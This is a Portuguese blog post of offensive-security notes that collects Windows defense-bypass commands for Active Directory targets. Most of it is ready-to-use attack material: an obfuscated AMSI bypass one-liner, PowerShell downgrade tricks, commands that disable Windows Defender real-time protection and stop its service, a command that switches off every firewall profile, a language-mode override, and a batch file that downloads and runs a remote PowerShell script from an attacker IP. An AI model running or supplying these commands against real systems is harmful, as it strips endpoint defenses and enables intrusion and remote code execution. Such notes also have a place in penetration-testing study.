---
title: "Active Directory - Resumo de Comandos"
tags: [Windows, Active Directory]
categories: ActiveDirectory
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/defense.png)

# Considerações Iniciais

Este é um dos meus tópicos favoritos quando falamos em Windows como um todo, não é especificamente AD, mas se aplica perfeitamente a este ambiente por se tratar de máquinas Windows, por isso deixei nessa Categoria.

Dividirei em seções, não vou demonstrar na máquina a grande parte delas, apenas deixar aqui os comandos para serem utilizados.

# Defense Bypass

## AMSI Bypass

O que é AMSI? 

A Antimalware Scan Interface (AMSI) é um componente do Microsoft Windows que permite uma inspeção mais aprofundada dos serviços de script integrados.

Nota: A integração AMSI apenas está disponível no Windows 10.

Advanced malware utiliza scripts ocultos ou encriptados para evitar os métodos tradicionais de análise. Malware deste tipo é normalmente carregado diretamente na memória, pelo que não utiliza quaisquer ficheiros no dispositivo.

AMSI é uma interface que as aplicações e serviços que estão a ser executadas no Windows podem utilizar para enviar pedidos para o produto antimalware instalado no computador. Oferece uma proteção adicional contra software nocivo que utiliza scripts ou macros em componentes Windows essenciais, como PowerShell e Office365, ou outras aplicações para evadir a deteção.

Ai está a cara dele... Ele detectou o Invoke-Mimikatz como se fosse perigoso para o sistema, então não deixou executar. Eu costumo dizer que ele é um "grep" no que você digita ou tenta executar na seção, se ele verificar alguma coisa de ruim, ele bloqueia, simples assim.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/amsi.png)

Para Bypassar ela temos algums métodos, o mais comum deles é este:

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Também podemos, se conseguir, executar o powershell na versão 1.0, deve ser executado com o caminho completo

`C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe`

As vezes um simples -ep bypass também ajuda no bypass do AMSI

`powershell -ep bypass`

Podemos realizar o downgrade dele

`powershell -version 2`

Ou o upgrade, sim, o upgrade dele bypassa o AMSI

`pwsh`

Após a execução deles, possivelmente o AMSI não vai mais incomodar vocês!

## Desativar Windows Defender

O que é Windows Defender?

Microsoft Defender é um software que remove malware, trojan, spyware e adware instalados no computador. Também monitoriza o computador para evitar que estes softwares perigosos modifiquem configurações tanto do navegador, como do sistema operacional.

A cara dele é igual ao do AMSI

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/amsi.png)

Para desabilitar ele temos três modos, lembrando que para isso devemos ter privilégios elevados na máquina

`Set-MpPreference -DisableIOAVProtection $true`

`Set-MpPreference -DisableRealtimeMonitoring $true`

`sc stop WinDefend`

Após isso você a princípio não será mais incomodado pelo Windows Defender ao executar seus scripts ou executáveis na máquina alvo.

## Verificação do Language Mode

O que é esse Language Mode?

O downgrade também funciona para o Language Mode

`powershell -version 2`

$ExecutionContext.SessionState.LanguageMode
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
Colocar o Invoke-Mimikatz no final do código também funciona, não somente o Invoke-Mimikatz mas qualquer outro comando ou script

## Desativando Firewall

Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

Verificando APPLOCKER POLICY

Get-AppLockerPolicy -Xml -Local
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleColletions

.bat Mandrake

$reverse = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''http://192.168.50.196/power.ps1''))'
Out-File -Encoding Ascii -InputObject $reverse -FilePath C:\Users\Desktop\reverse.bat